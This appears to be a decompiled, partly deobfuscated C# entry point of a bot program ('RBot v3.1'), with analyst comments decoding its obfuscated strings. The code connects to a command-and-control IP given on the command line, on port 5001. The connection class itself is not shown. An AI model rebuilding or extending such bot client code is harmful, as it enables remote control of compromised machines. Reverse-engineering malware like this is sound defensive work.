// Decompiled with JetBrains decompiler
// Type: ns0.Class0
// Assembly: bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A2C92CEF-E226-4220-B754-98A291323477

using System;

namespace ns0
{
  internal class deobMain
  {
    private static void Main(string[] args)
    {
      if (args.Length < 1)
      {
        Console.WriteLine("ጪ䬣ᰧ̷िз嵩ణᴴḹᠰ䬫攅搌✑㜔約⭊㸙朂ⴓ㨗∀焝爖㬔眐神");
        //Usage: bot.exe CONTROLLER_IP
      }
      else
      {
        Console.WriteLine("മݣ✅┖㼅癊稘昈㤅椅㈉ℝ⌑ⵋ瘍椖㬟");
        //[*]RBot v3.1 2018
        string deobIPArg = args[0];
        int deobPort = 5001;
        try
        {
          Console.Write("ꛠꏭ");
          //[+
          deobConnect class1 = new deobConnect(deobIPArg, deobPort);
        }
        catch (Exception ex)
        {
        }
      }
    }
  }
}
